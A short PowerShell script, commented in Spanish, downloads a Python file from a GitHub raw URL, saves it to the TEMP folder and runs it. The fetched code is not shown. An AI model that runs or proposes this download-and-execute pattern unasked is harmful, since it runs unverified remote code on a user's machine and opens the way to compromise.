# Descargar el archivo main.py desde la URL
$pythonScript = irm -Uri "https://raw.githubusercontent.com/astronomyc/filesRecents/main/test.py" -UseBasicParsing

# Guardar el contenido descargado en un archivo temporal
$tempPath = Join-Path $env:TEMP "main.py"
$pythonScript | Out-File -FilePath $tempPath -Encoding utf8

# Ejecutar el script Python
python $tempPath
